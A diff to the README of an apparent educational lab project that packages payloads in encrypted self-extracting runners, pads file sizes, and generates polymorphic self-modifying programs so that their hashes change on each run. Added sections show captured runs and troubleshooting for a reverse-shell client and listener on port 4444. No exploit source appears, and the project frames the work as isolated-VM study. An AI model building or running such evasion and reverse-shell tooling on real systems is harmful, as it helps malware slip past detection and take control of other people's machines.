@@ -156,43 +156,36 @@ The subject asks for binary manipulation, encryption, file-size changes, delayed
 - For the subject demonstration, a dedicated Windows 10/11 virtual machine configured and inspected by the auditor.
 - Optional, only for a native `.exe` build: `python -m pip install pyinstaller` **inside the isolated VM**. The Windows bootloader ships with the Windows package, so the build must happen in the VM.
 
-### Recommended repository layout
+### Repository layout
 
 ```text
-Hidden-Bytes/
+hidden-bytes/
 ├── src/
 │   ├── __init__.py
-│   ├── common.py          # shared utilities (key size, args)
-│   ├── embedding.py       # shared PyInstaller / AES-source helpers
-│   ├── evasion/             # HBX1 packaging tool (package)
-│   │   ├── __init__.py      # public API re-exports
-│   │   ├── __main__.py      # enables `python -m src.evasion`
-│   │   ├── constants.py
-│   │   ├── encoding.py
-│   │   ├── container.py
-│   │   ├── crypto.py
-│   │   ├── runner.py        # self-extracting runner generation
-│   │   └── cli.py
-│   └── polymorphic.py       # self-modifying program generator
+│   ├── common.py
+│   ├── embedding.py
+│   ├── polymorphic.py
+│   ├── polymorphic_template.py
+│   └── evasion/
+│       ├── __init__.py
+│       ├── __main__.py
+│       ├── cli.py
+│       ├── constants.py
+│       ├── encoding.py
+│       ├── container.py
+│       ├── crypto.py
+│       ├── runner.py
+│       └── runner_template.py
 ├── lab/
-│   ├── reverse_shell_payload.py   # lab payload: connects back to the operator
-│   ├── listener.py                # lab listener: accepts and relays one session
-│   ├── vm_preflight.sh            # VM isolation and toolchain check (bash)
-│   ├── vm_preflight.ps1           # VM isolation and Defender check (Windows)
-│   ├── defender_scan.ps1          # scan an artifact with the real Defender
-│   ├── detect_surface.py          # what a scanner can see in an artifact
-│   └── vt_check.py                # VirusTotal submission and detection ratio
-├── evasion                  # optional launcher script
-├── polymorphic              # optional launcher script
 ├── tests/
+├── evasion
+├── polymorphic
 ├── requirements.txt
 ├── requirements-dev.txt
-├── README.md
-└── output/                  # generated examples; optional
+└── README.md
 ```
 
-The precise test filenames may differ in your checkout. Run every command below
-from the **project root** so that the `src` package is importable.
+Run every command below from the **project root** so that the `src` package is importable.
 
 ### Windows PowerShell
 
@@ -723,7 +716,7 @@ Run it:
 
 Two practical notes for the `.exe` build:
 
-- **The bundled Python runtime adds fixed overhead** (roughly 9–15 MB depending on the platform and interpreter). The size target therefore has to exceed that overhead; `--add-size 101` does. If you request a size that is too small, the tool reports the minimum it needs instead of failing silently.
+- **The bundled Python runtime adds fixed overhead** (roughly 10–20 MB depending on the platform and interpreter; around 13 MB in this project's measurements). The size target therefore has to exceed that overhead; `--add-size 101` does. If you request a size that is too small, the tool reports the minimum it needs instead of failing silently.
 - **The size is exact.** The padding is appended after the packaged archive. The PyInstaller loader locates its archive with a back-to-front scan for its cookie, so trailing bytes do not affect execution. The final file is exactly `original_size + requested_size` bytes.
 
 An output name ending in `.exe` is packaged into a native executable automatically; any other name produces the Python-archive runner.
@@ -854,7 +847,7 @@ demo.pyz   ← THE RUNNER   (the one file the CLI made — e.g. 20,984 bytes on 
 
 - **The runner** = `demo.pyz` — a real file in your folder. This is what you run.
 - **The container** = `payload.hbx` — embedded *inside* the runner, not a loose file until you extract it. Its first bytes literally spell `HBX1` followed by the JSON header (`{"algorithm":"AES-256-GC...`). That `HBX1` magic is the container's signature.
-- **A standalone `.hbx` + `.key` pair** is only produced by the internal `encrypt_file` API, which the CLI never calls — so normal `--encrypt` never leaves a bare `.hbx` behind.
+- **There is no bare `.hbx` or separate `.key` file.** `--encrypt` always produces a single self-extracting runner with the container (`payload.hbx`) and the key embedded inside it; nothing is written beside it.
 
 Mental model: **the runner is the box you ship; the container (`payload.hbx`) is the locked parcel inside it.** `--inspect` and `--decrypt` reach into the box, pull out `payload.hbx`, and read it for you.
 
@@ -982,6 +975,40 @@ python3 polymorphic_demo.py
 sha256sum polymorphic_demo.py
 ```
 
+Representative captured run (PowerShell in the Windows VM), generating from a
+one-line payload and running three times — the hash is **different every run**
+while the output never changes:
+
+```text
+PS> "print('hello from the payload')" | Out-File -Encoding ascii msg.py
+PS> py -m src.polymorphic --generate demo.py --payload msg.py
+[OK] Generated polymorphic program: "demo.py"
+[INFO] The payload is encrypted inside the generated program.
+[INFO] Every run rewrites the program's own source, so its hash changes while its behaviour stays the same.
+
+PS> py demo.py
+[INFO] Polymorphic signature updated successfully.
+hello from the payload
+PS> Get-FileHash demo.py -Algorithm SHA256
+SHA256   6B0F4DFF17E158143C848528DCB1EEB954AA92A2E413DD1198F2644D527701D4   demo.py
+
+PS> py demo.py
+[INFO] Polymorphic signature updated successfully.
+hello from the payload
+PS> Get-FileHash demo.py -Algorithm SHA256
+SHA256   66287366EFA3E3059C45410CBC4C2639F1CB370CCFC5CB95329FBB8F9636A4D7   demo.py
+
+PS> py demo.py
+[INFO] Polymorphic signature updated successfully.
+hello from the payload
+PS> Get-FileHash demo.py -Algorithm SHA256
+SHA256   62EBA187EE11C47B54198AC826FA84A786A6B79E0FCD014BF1668C80077CA91E   demo.py
+```
+
+Three runs, three distinct hashes, identical output — the self-modification
+produces a fresh random token on every run, so the file hash keeps changing
+indefinitely rather than stalling after the first change.
+
 Expected observations:
 
 1. The program prints the same payload output on each run.
@@ -1089,6 +1116,27 @@ The listener output:
 Typing a command in the listener terminal now runs it in the remote shell.
 
 > **In the Windows VM**, use the VM's host-only address instead of `127.0.0.1` so the two ends can reach each other, and keep the network adapter in **Host-Only** mode. The subject's example uses `192.168.1.100`; replace it with the address of the machine running the listener.
+
+#### Ordering matters — two common errors
+
+The listener and the client have to overlap in time. Two failures look alarming but are just ordering/port mistakes:
+
+```text
+# The listener was started, waited, and nobody connected in time:
+PS> py .\lab\listener.py --port 4444
+[INFO] Listening on 127.0.0.1:4444. Waiting for a connection...
+[ERROR] No connection received before the timeout.
+```
+
+```text
+# The client was run while no listener was up on that port:
+PS> py demo.py --host 127.0.0.1 --port 4444
+[INFO] Polymorphic signature updated successfully.
+[INFO] Reverse shell initialized. Connecting to 127.0.0.1:4444...
+[ERROR] Could not connect to 127.0.0.1:4444: [WinError 10061] No connection could be made because the target machine actively refused it
+```
+
+Fix: **start the listener first, then run the client within the listener's wait window**, and make sure both use the **same port**. `WinError 10061` (connection refused) means no listener is accepting on that host/port; "No connection received before the timeout" means the listener gave up before the client connected. Re-run the listener immediately before launching the generated program.
 
 ### 5.7 Packaging as a native executable
 
@@ -1276,7 +1324,7 @@ flowchart LR
     E --> K[Random key embedded in the runner artifact]
     H --> R[Runner: wait, decrypt, launch]
     R --> O[Payload executed as a child process]
-    E --> R2[Container mode: recover to disk]
+    E --> R2[--decrypt: recover payload to disk, without running it]
     P --> S[Generated self-modifying program]
     S --> V[Signature token changes on execution]
     V --> X[File hash changes]
@@ -1386,7 +1434,7 @@ Recommended controls include application control/allowlisting, least privilege, 
 4. **Not a native PE polymorpher:** the self-modification is a text substitution in a Python source file, and the `.exe` output is a PyInstaller bundle. Neither is machine-code mutation.
 5. **The self-modification needs a writable file:** if the generated program is read-only, the signature update fails and the hash stops changing. The program still runs.
 6. **Key protection is the user's responsibility:** the random AES-256 key is embedded in the runner artifact. Protect the runner with access controls; anyone who can read it can recover the payload.
-7. **The `.exe` output has a fixed runtime overhead:** the bundled Python interpreter and the `cryptography` library add roughly 14–20 MB, so the requested size increase must exceed that. The tool reports the minimum required size instead of failing silently.
+7. **The `.exe` output has a fixed runtime overhead:** the bundled Python interpreter and the `cryptography` library add roughly 10–20 MB (around 13 MB in this project's measurements), so the requested size increase must exceed that. The tool reports the minimum required size instead of failing silently.
 8. **Manual isolation verification:** source code and README instructions cannot prove the VM is isolated.
 9. **Audit results must be measured:** do not claim a detection percentage or a pass without recorded, reproducible evidence.
 10. **Building a `.exe` needs PyInstaller:** it requires `python -m pip install pyinstaller` inside the isolated VM. The `.pyz` form needs only a Python interpreter with `cryptography` installed.
